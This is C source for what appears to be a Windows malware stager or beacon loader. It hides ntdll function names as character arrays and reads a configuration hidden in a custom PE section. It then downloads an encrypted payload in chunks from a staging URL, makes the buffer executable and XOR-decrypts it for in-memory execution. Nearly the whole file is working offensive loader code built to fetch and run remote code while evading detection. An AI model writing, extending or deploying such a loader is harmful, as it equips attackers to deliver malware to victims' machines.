//
// Created by scrub on 10/9/2024.
//

#include <stdio.h>
#include "../../Beacond.h"
#include "../../Lib/cJSON/cJSON.h"
#include "../Common/Common.h"
#include "../../Core/Include/Macros.h"
#include "../../Core/Include/Crypto.h"
#include "../../Core/Include/Http.h"
#include "../../Core/Include/Utils.h"
#include "../../Core/Include/Wrappers.h"

WCHAR wntdll[] = {'n', 't', 'd', 'l', 'l', '.', 'd', 'l', 'l', '\0'};
WCHAR cGetProcessHeaps[] = {'R', 't', 'l', 'G', 'e', 't', 'P', 'r', 'o', 'c', 'e', 's', 's', 'H', 'e', 'a', 'p', 's', '\0'};
WCHAR cHeapCreate[] = {'R', 't', 'l', 'C', 'r', 'e', 'a', 't', 'e', 'H', 'e', 'a', 'p', '\0'};
WCHAR cAllocateHeap[] = {'R', 't', 'l', 'A', 'l', 'l', 'o', 'c', 'a', 't', 'e', 'H', 'e', 'a', 'p', '\0'};
WCHAR cFreeHeap[] = {'R', 't', 'l', 'F', 'r', 'e', 'e', 'H', 'e', 'a', 'p', '\0'};
WCHAR cDestroyHeap[] = {'R', 't', 'l', 'D', 'e', 's', 't', 'r', 'o', 'y', 'H', 'e', 'a', 'p', '\0'};
WCHAR cAllocateVirtualMemory[] = {'N', 't', 'A', 'l', 'l', 'o', 'c', 'a', 't', 'e', 'V', 'i', 'r', 't', 'u', 'a', 'l', 'M', 'e', 'm', 'o', 'r', 'y', '\0'};
WCHAR cProtectVirtualMemory[] = {'N', 't', 'P', 'r', 'o', 't', 'e', 'c', 't', 'V', 'i', 'r', 't', 'u', 'a', 'l', 'M', 'e', 'm', 'o', 'r', 'y', '\0'};
WCHAR cFreeVirtualMemory[] = {'N', 't', 'F', 'r', 'e', 'e', 'V', 'i', 'r', 't', 'u', 'a', 'l', 'M', 'e', 'm', 'o', 'r', 'y', '\0'};
WCHAR cCreateThreadEx[] = {'N', 't', 'C', 'r', 'e', 'a', 't', 'e', 'T', 'h', 'r', 'e', 'a', 'd', 'E', 'x', '\0'};
WCHAR cNtWaitForSingleObject[] = {'N', 't', 'W', 'a', 'i', 't', 'F', 'o', 'r', 'S', 'i', 'n', 'g', 'l', 'e', 'O', 'b', 'j', 'e', 'c', 't', '\0'};

BOOL LoadAPI() {
    // Heap Memory
    Beacon->Api.GetProcessHeap = (fnRtlGetProcessHeaps)GetProcAddressC(GetModuleHandleC(wntdll), cGetProcessHeaps);
    if (Beacon->Api.GetProcessHeap == NULL) {
        return FALSE;
    }
    Beacon->Api.HeapCreate = (fnRtlCreateHeap)GetProcAddressC(GetModuleHandleC(wntdll), cHeapCreate);
    if (Beacon->Api.HeapCreate == NULL) {
        return FALSE;
    }
    Beacon->Api.HeapAlloc = (fnRtlAllocateHeap)GetProcAddressC(GetModuleHandleC(wntdll), cAllocateHeap);
    if (Beacon->Api.HeapAlloc == NULL) {
        return FALSE;
    }
    Beacon->Api.HeapFree = (fnRtlFreeHeap)GetProcAddressC(GetModuleHandleC(wntdll), cFreeHeap);
    if (Beacon->Api.HeapFree == NULL) {
        return FALSE;
    }
    Beacon->Api.DestroyHeap = (fnRtlDestroyHeap)GetProcAddressC(GetModuleHandleC(wntdll), cDestroyHeap);
    if (Beacon->Api.DestroyHeap == NULL) {
        return FALSE;
    }
    // Virtual Memory
    Beacon->Api.VirtualAlloc = (fnNtAllocateVirtualMemory)GetProcAddressC(GetModuleHandleC(wntdll), cAllocateVirtualMemory);
    if (Beacon->Api.VirtualAlloc == NULL) {
        return FALSE;
    }
    Beacon->Api.VirtualProtect = (fnNtProtectVirtualMemory)GetProcAddressC(GetModuleHandleC(wntdll), cProtectVirtualMemory);
    if (Beacon->Api.VirtualProtect == NULL) {
        return FALSE;
    }
    Beacon->Api.VirtualFree = (fnNtFreeVirtualMemory)GetProcAddressC(GetModuleHandleC(wntdll), cFreeVirtualMemory);
    if (Beacon->Api.VirtualFree == NULL) {
        return FALSE;
    }
    Beacon->Api.CreateThread = (fnNtCreateThreadEx)GetProcAddressC(GetModuleHandleC(wntdll), cCreateThreadEx);
    if (Beacon->Api.CreateThread == NULL) {
        return FALSE;
    }
    Beacon->Api.WaitForSingleObject = (fnNtWaitForSingleObject)GetProcAddressC(GetModuleHandleC(wntdll), cNtWaitForSingleObject);
    if (Beacon->Api.WaitForSingleObject == NULL) {
        return FALSE;
    }


    return TRUE;
}


BOOL LoadConfig(PCHAR dataString) {
    cJSON *json = cJSON_Parse(dataString);
    if (json == NULL) {
        return FALSE;
    }
    // TODO fix these strings
    Beacon->Config.PayloadSize      = strtoul(cJSON_GetObjectItemCaseSensitive(json, "1")->valuestring, 0, 10);
    Beacon->Config.EncryptionKey    = cJSON_GetObjectItemCaseSensitive(json, "2")->valuestring;
    Beacon->Config.StagingURL       = cJSON_GetObjectItemCaseSensitive(json, "3")->valuestring;
    Beacon->Config.ChunkCount       = strtoul(cJSON_GetObjectItemCaseSensitive(json, "4")->valuestring, 0, 10);
    Beacon->Config.isBeacon         = strtoul(cJSON_GetObjectItemCaseSensitive(json, "5")->valuestring, 0, 10);
    return TRUE;
}

// Parses PE section containing payload data
BOOL ParsePESection() {
    PTEB_A teb = (PTEB_A)NtCurrentTeb();
    PPEB_A peb  = (PPEB_A)teb->ProcessEnvironmentBlock;

    PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)peb->ImageBaseAddress;
    if (pDosHeader->e_magic != IMAGE_DOS_SIGNATURE) {
        return -1;
    }
    PIMAGE_NT_HEADERS pNtHeaders = (PIMAGE_NT_HEADERS)(peb->ImageBaseAddress + pDosHeader->e_lfanew);
    if (pNtHeaders->Signature != IMAGE_NT_SIGNATURE) {
        return -1;
    }

    PIMAGE_FILE_HEADER pFileHeader = (PIMAGE_FILE_HEADER)(peb->ImageBaseAddress + pDosHeader->e_lfanew + sizeof(DWORD));

    PIMAGE_SECTION_HEADER pSectionHeader = (PIMAGE_SECTION_HEADER)(peb->ImageBaseAddress + pDosHeader->e_lfanew + sizeof(IMAGE_NT_HEADERS));
    //printf("[+] Number of sections %d\n", pFileHeader->NumberOfSections);


    // Pointer arithmetic
    for (int i = pFileHeader->NumberOfSections-1; i>=0; i--) {
        PIMAGE_SECTION_HEADER test = (PIMAGE_SECTION_HEADER)&pSectionHeader[i];
        // TODO fix this string
        if (strcmp((CHAR*)test->Name, ".TEST") == 0) {
            BYTE* sectionData = (BYTE*)(peb->ImageBaseAddress + test->VirtualAddress);
            LoadConfig((CHAR*)sectionData);
        }

    }
    return 0;
}

BOOL FetchPayload(PVOID *pPayloadBuffer) {
    // TODO Check if API is loaded

    LPVOID          pTempPayloadBuffer      = NULL;
    ULONG           puOldAccessRights       = 0;
    DWORD           dwBytesWritten          = 0;

    DWORD dwChunkSize = Beacon->Config.PayloadSize / Beacon->Config.ChunkCount;

    // allocate payload buffer
    SIZE_T dwSizeVirtual = Beacon->Config.PayloadSize;
    V_ALLOC(pTempPayloadBuffer, dwSizeVirtual);

    // TODO Allocate phony memory buffer

    for (int i = 0; i <= Beacon->Config.ChunkCount - 1; i++) {
        PVOID pTempBuffer = NULL;
        PWCHAR pWUrl = NULL;
        // TODO MOVE THIS TO BEGINNING AND SAVE Beacon->Config.StagingUrl as WCHAR
        ConvertPCHARtoWCHAR(Beacon->Config.StagingURL, &pWUrl);

        //printf("WURL %ls\n", pWUrl);
        WCHAR url[1024];
        // TODO Fix this string
        _swprintf(url, L"%ls%d.txt", pWUrl, i);
        //printf("URL %ls\n", url);
        HttpDownloadPayload(url, dwChunkSize, &pTempBuffer, &dwBytesWritten);
        PVOID pMemoryAddress = pTempPayloadBuffer + (i * dwBytesWritten);
        // TODO free pTempBuffer
        MEMCPY(pMemoryAddress, pTempBuffer, dwChunkSize);
    }

    V_PROTECT(pTempPayloadBuffer, dwSizeVirtual, PAGE_EXECUTE_READWRITE, puOldAccessRights);
    // Decrypt // TODO Change name
    XOR(pTempPayloadBuffer, Beacon->Config.PayloadSize, (BYTE)*Beacon->Config.EncryptionKey);

    *pPayloadBuffer = pTempPayloadBuffer;
    // Run Payload
    return TRUE;
}

